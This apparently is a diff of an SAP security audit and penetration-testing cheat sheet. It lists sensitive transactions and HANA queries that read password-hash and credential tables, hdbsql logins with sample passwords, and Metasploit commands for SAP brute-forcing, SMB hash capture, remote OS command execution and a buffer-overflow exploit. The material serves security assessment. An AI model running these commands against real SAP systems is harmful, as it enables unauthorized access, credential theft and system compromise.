-```
-+ Inspect which users access SAP spool items, especially those that were not created by them.
-+ Define sensitive spool items by criteria and alert when they are accessed.
-```
-
---------------
-### 06. Development kits and transactions
-```
-SAP Developper/ABAP/Workbench
-—————————————————————————————
-> SE36 ABAP/4: Logical Databases
-> SE37 ABAP/4 Function Modules
-> SE38 ABAP/4 Program Development
-> SE80 ABAP/4 Development Workbench
-> SE81 SAP Application Hierarchy
-> SE82 Customer Application Hierarchy
-> SE84 ABAP/4 Repository Information System
-> SE86 ABAP/4 Repository Information System 
-```
-```
-kit de développement RFC
-—————————————————————————
-Le kit de développement RFC permet de créer / modifier / supprimer une interface de type RFC (Remote Function Call). 
-Il est installé en standard par SAP.
-La gestion des liaisons RFC est réservée à un groupe restreint d’administrateurs clairement identifiés. La liste est tenue à jour.
-> suppression du kit de développement RFC (SDK « RFCSDK ») sur l’environnement de production.
-```
-```
-Remove developer keys from productive systems
-—————————————————————————————————————————————
-Many auditors check on productive SAP systems if any developer keys exist (in table DEVACCESS). 
-If there are any, this might become a finding that can easily avoid (… although the system is properly protected against changes in SCC4 and SE03).
-```
-
-------------------
-### 07. SAP User and Access Management
-
-<i/> Restrict access and permissions to the SAP transactions allowing to display the tables containing the SAP password hashes </i>
-> Several SAP transactions can be used to display the table USR02 and/or the view VUSR02_PWD that contain the local password hashes.
-```
-> SAP Quick Viewer : SQVI 
-> SAP Standard query : SQ01 
-> ST04
-> SE16
-> SE16n
-> SCMP  (View / Table Comparison)
-```	
-
-<i/> Review who has access (and with which permissions) to the following list of powerful SAP transactions </i>
-```
-> DBxx  			– Database related transactions
-> SCC4, SCC5 			- Client administration
-> SE01, SE10 			- CTS / TMS commands
-> SE38 				– ABAP Editor  (display, edit, execute ABAP source code)
-> SA38				– Only allows ABAP source code execution
-> SE93				– Maintains transactions (ex. create or copy a TCODE)
-> SM01 				- Lock / unlock transactions
-> SM12				– Lock entries
-> SM30, SM31			– Table Maintenance (can be used to display and update table data)
-> SE11, SE12, SE13, SE14 	- Table structure maintenance
-> SE14				- The database utility is the interface between the ABAP Dictionary and the relational database underlying the R/3 System.
-				  It allows you to edit (create, delete and adjust to changes to their definition in the ABAP Dictionary) database objects
-				  derived from objects of the ABAP Dictionary.
-> SE15				– Data Dictionary
-> ST04				- Database performance monitor (allow to send SQL request to the database)
-> SM32				– Updates Table USR40 with invalid passwords
-> SM3 				– Displays and deletes processing job logs
-> SM36/SM37			– Schedule Background Job 
-> SM49				– Execute external operating system commands
-> SM52				– Execute operating system commands
-> SM59				– Maintain Remote Function Calls destination definitions
-> SM69				– Maintain external commands
-> SP01				- Administer print spools
-> PFCG				- Role Maintenance (PFCG) can be used to create role and user like SU01
-> SU01         	 		- Maintain users, Security Administration transactions (create/delete/lock/unlock user account, change password etc.)
-> SU02     			- Allocate authorizations to a profile. Maintain SAP Authorization Profiles.     
-				  The transaction code SU02 can be use to manually edit SAP profiles. 
-				  As notification from the initial screen, SAP has recommended to not use this transaction any longer
-				  for profile and user administration.
-> SU10				- User MAss Maintenance (ex. Lock and Unlock user account, Change the password of a user?)
-				- Delete/add a profile for all users
-> SU03n
-> SU03     			- Maintenance of Authorizations 
-> SU53     			- Evaluate Authorization Check
-> AL11				- Display all the SAP Directories and files stored on the underlying OS server 
-> Program/report "RPCIFU01" 	- Display OS files
-> Program/report "RPCIFU03" 	- Download OS files	
-> Program/report "RSBDCOS0" 	- Execute OS commands
-> CG3Z or GUI_upload and CG3Y or GUI_download  - Upload / download files to SAP systems (underlying OS server)
-> SXDA, SXDB			- Data Transfer Workbench 
-> SXDA_TOOLS    		- DX Workbench: tools  
-> SU56				- User Authorization Buffer
-> SM01				- Can be used to block specific transactions and to list all transactions
-> RSUDO 			- idem SUDO mais pour SAP
-> RSRT 				- Query monitor
-> SCMP 				- Table/View Comparaison
-> SQVI				- Table Quickviewer
-> SUIM				- select USER and then "specific transactions" to see the list of users having access to specifics transactions
-	
-> OS04				- Local System Configuration
-> OS05				- Remote System Configuration
-> OS06				- Local Operating System Activity
-> OS07				- Remote Operating System Activity
-
-> SM13				- Administrate Update Records
-> SM1				- Update Program Administration
-> SM20				- Security Audit Log Assessment
-> SM21				- Online System Log Analysis
-	
-> TU02				- Parameter changes
-	
-> SE06				- Set Up Transport Organizer
-> STMS				- Transport Management System
-> SCC4				- (customize it to ztcode) - Administrationdes mandants 
-```
-
-<i/> Weak parameter transactions </i>
-```
-Parameter transactions execute an existing transaction delivering pre-defined screen input.
-To determine all unsafe parameter transactions for SE16, SM30… you need to search for PARAMs matching "/N<TCD>" (e.g. "/NSM30*") in the table TSTCP.
-=> The presence of "/*" indicates that the first screen is skipped and thus the view name cannot be overridden.
-=> The presence of "/N<TCD>" (e.g. "/NSM30*") indicates that the first screen is not skipped and thus the pre-filled view name can be overridden (leaving the choice of the actual view name up to the user).
-Sources:
-- https://www.daniel-berlin.de/security/sap-sec/table-authorizations/
-- https://www.daniel-berlin.de/security/sap-sec/weak-parameter-transactions-sap/
-```
-
 -------------------
-### 08. SAP Hana Database security configuration review
 
-<i/> List of useful SQL queries to extract the database configuration (e.g. list of users, roles, privileges, password policy, logs) </i>
-```
-'SELECT * FROM SYS.USERS LIMIT 500'
-'SELECT * FROM SYS.USERS_PARAMETERS LIMIT 500'
-'SELECT * FROM SYS.M_PASSWORD_POLICY'
-'SELECT * FROM SYS.P_CREDENTIALS_'
-'SELECT * FROM SYS.M_SECURESTORE'
-'SELECT * FROM SYS.SCHEMAS LIMIT 500'
-'SELECT * FROM SYS.ROLES LIMIT 500'
-'SELECT * FROM SYS.PRIVILEGES’
-'SELECT * FROM SYS.PROCEDURES'
-'SELECT * FROM SYS.P_CREDENTIALS_' (not authorized)
-'SELECT * FROM SYS.TABLES LIMIT 500'
-'SELECT * FROM SYS.AUDIT_ACTIONS LIMIT 500'
-'SELECT * FROM SYS.M_CONNECTIONS'
-'SELECT * FROM SYS.M_DATABASE'
-'SELECT * FROM SYS.M_HOST_INFORMATION'
-'SELECT * FROM SYS.M_INIFILE_CONTENTS' 
-'SELECT * FROM usr02;'
-```
+### 4. SAP penetration testing using NMAP and the Metasploit framework
 
-<i/> How to log into the database to extract the configuration </i>
-```
-> [Option 1] The SAP HANA configuration can be collected using a “SAP Basis” account with the ‘ST04’ and ‘DBxx’ transactions
-
-> [Option 2] Use SAP HANA HDBSQL to execute SQL commands at OS level.
-
-	+ HDBSQL is a command line tool for executing commands on SAP HANA databases.
-          SAP HANA HDBSQL is also used to automate the HANA Database backups using cron scripts. 
-	+ Requirement: You want to access SQL prompt using HDBSQL at OS level. 
-	+ Prerequisites : You need password of <SID>ADM user and User with HANA database access, in our example we are connecting using SYSTEM.
-	+ Steps :
-	• Logon to HANA host with <SID>adm user.
-	• Once you are logged in as <SID>adm  you can directly execute the hdbsql command , or you can go to following path and execute the hdbsql command.  
-	• cd /hana/shared/<SID>/hdbclient 
-	• Now execute the command 
-	• hdbsql  -n localhost -i 00 -u SYSTEM -p Ina123  
-
-	Once you get the command , enter \s to get the system information you are connected to.
-	Exit HDBSQL by entering the command: exit or quit or \q
-
-	You can also log on with user credentials for the secure user store (hdbuserstore) with -U <user_key>. 
-	HDBSQL Examples :
-	---------------
-	> hdbsql  -n localhost -i 00 -u SYSTEM -p Ina123;
-	> hdbsql -S DEV -n localhost:30015 -u SYSTEM -p In123 ;
-	> hdbsql -n localhost -i 00 -u myuser -p myuserpassword "select * from sys.users";
-	> hdbsql -U myUserSecureStore "Select table_name, schema_name from m_tables" ;
-	> hdbsql -U SUPER "SELECT * FROM SYS.P_CREDENTIALS_" ;
-	> hdbsql -u SYSTEM -n HOSTNAME:34215 -s EEP -sslprovider commoncrypto -sslkeystore $SECUDIR/sapsrv.pse -ssltruststore $SECUDIR/sapsrv.pse "SELECT * FROM SYS.P_CREDENTIALS_" ; 
-
-	Note:
-	"A user administrator can exclude users from this password check with the following SQL statement: ALTER USER <user_name> DISABLE PASSWORD LIFETIME.
-	 However, this is recommended only for technical users only, not database users that correspond to real people.
-	 A user administrator can re-enable the password lifetime check for a user with the following SQL statement: ALTER USER <user_name> ENABLE PASSWORD LIFETIME"
-```
-
--------------------
-### 09. SAP penetration testing using NMAP and the Metasploit framework
-
-<i/> SAP Discovery using NMAP (network port scanner - https://nmap.org) </i>
+<i/> 4.1 - SAP Discovery using NMAP (network port scanner - https://nmap.org) </i>
 ```
 > root@kali-linux$ nmap -sS -sV -v -p- 10.13.34.12
 	<SNIP>
@@ -820,7 +913,7 @@ Sources:
 	|_      https://help.sap.com/saphelp_nw73ehp1/helpdata/en/4a/5c004250995a6ae10000000a42189b/frameset.htm
 ```
 
-<i/> SAP discovery using NMAP custom probes for a better detection of SAP services (https://github.com/gelim/nmap-erpscan) </i>
+<i/> 4.2 - SAP discovery using NMAP custom probes for a better detection of SAP services (https://github.com/gelim/nmap-erpscan) </i>
 ```
 => https://github.com/gelim/nmap-erpscan/blob/master/sap_ports.py
 
@@ -845,7 +938,7 @@ Sources:
 	Service Info: Host: java745
  ```
 
-<i/> SAP discovery using the Metasploit module 'sap_service_discovery' (https://www.metasploit.com) </i>
+<i/> 4.3 - SAP discovery using the Metasploit module 'sap_service_discovery' (https://www.metasploit.com) </i>
 ```
 Module to perform network scans against SAP platforms, which can be found under 'modules/auxiliary/scanner/sap/sap_service_discovery.rb': 
 msf  > use auxiliary/scanner/sap/sap_service_discovery.
@@ -853,7 +946,7 @@ msf  > set RHOST 192.168.1.149
 msf  > exploit
 ```
 
-<i/> SAP Router </i>
+<i/> 4.4 - SAP Router </i>
 ```
 Module to launch a port scanner through a SAProuter. 
 The module is available on 'modules/auxiliary/scanner/sap/sap_router_portscanner.rb' and allows two types of working modes: 
@@ -869,7 +962,7 @@ msf > use auxiliary/scanner/sap/sap_icm_urlscan
 msf auxiliary(sap_icm_urlscan) > show options
 ```
 
-<i/> Attacking the SOAP RFC with Metasploit (e.g.password brute-force, remote OS command execution) </i>
+<i/> 4.5 - Attacking the SOAP RFC with Metasploit (e.g.password brute-force, remote OS command execution) </i>
 ```
 When enabled, this service allows remote execution of ABAP programs and functions via HTTP SOAP requests. 
 This RFC calling mechanism is protected by HTTP Basic headers (valid SAP credentials are needed), and communications encryption is provided
@@ -940,7 +1033,7 @@ exploits/multi/sap/sap_soap_rfc_ sxpg_command_exec.rb
   Valid SAP credentials are required. 
 ```
 
-<i/> SMB Relay attacks using Metasploit </i>
+<i/> 4.6 - SMB Relay attacks using Metasploit </i>
 ```
 There is also an interesting attack that can target different SAP functions and is reachable via the SOAP RFC or other components
 such as those in the J2EE engine—more about that later. 
@@ -953,7 +1046,7 @@ tries to access it.
 > Module to run to capture the SMB Hashs (LMhash and NTHash): auxiliary/server/capture/smb module capturing SMB hashes 
 ```
 
-<i/> SAP Web interface password brute-force using Metasploit </i>
+<i/> 4.7 - SAP Web interface password brute-force using Metasploit </i>
 ```
 Launch password brute-force attacks against the Web GUI with the Metasploit module "auxiliary/scanner/sap/sap_web_gui_brute_login.rb"
 
@@ -974,7 +1067,7 @@ msf auxiliary(sap_web_gui_brute_login) > run
 msf auxiliary(sap_web_gui_brute_login)
 ```
 
-<i/> SAP Portal - J2EE engine exploits </i>
+<i/> 4.8 - SAP Portal - J2EE engine exploits </i>
 ```
 Alexander Polyakov and Dmitry Chastuhin presented work on the J2EE engine (SAPocalypse NOW: Crushing SAP’s J2EE Engine and Breaking SAP Portal). 
 Attacks from the above presentations have been published as Metasploit modules: 
@@ -984,7 +1077,7 @@ Attacks from the above presentations have been published as Metasploit modules:
    > The module can be found at modules/exploits/windows/http/sap_con gservlet_exec_no_auth.rb.  
 ```
 
-<i/> Attacking the SAP Management Console with Metasploit </i>
+<i/> 4.9 - Attacking the SAP Management Console with Metasploit </i>
 ```
 Attack of the SAP MC SOAP interface to retrieve a lot of interesting information about an SAP system :
 
@@ -1029,7 +1122,7 @@ modules/exploits/windows/http/sap_mgmt_con_osexec_ payload.rb
  SAP Management Console credentials are required. 
 ```
 
-<i/> Exploiting SAPHostControl with Metasploit </i>
+<i/> 4.10 - Exploiting SAPHostControl with Metasploit </i>
 ```
 The component that provides the SOAP endpoint for the SAP Management Console on the TCP port '50013' for the default instance is "startsrv". 
 
@@ -1057,7 +1150,7 @@ verbose => true
 msf auxiliary(sap_hostctrl_getcomputersystem) > run
 ```	
 
-<i/> SAP NetWeaver Dispatcher </i>
+<i/> 4.11 - SAP NetWeaver Dispatcher </i>
 ```
 The disp+work.exe process is vulnerable to a buffer overflow (CVE-2012-2611) while handling Traces, which can be exploited with the metasploit module modules/exploits/windows/misc/sap_netweaver_dispatcher.rb: 
 msf  exploit(sap_netweaver_dispatcher) > use exploit/windows/misc/sap_netweaver_dispatcher
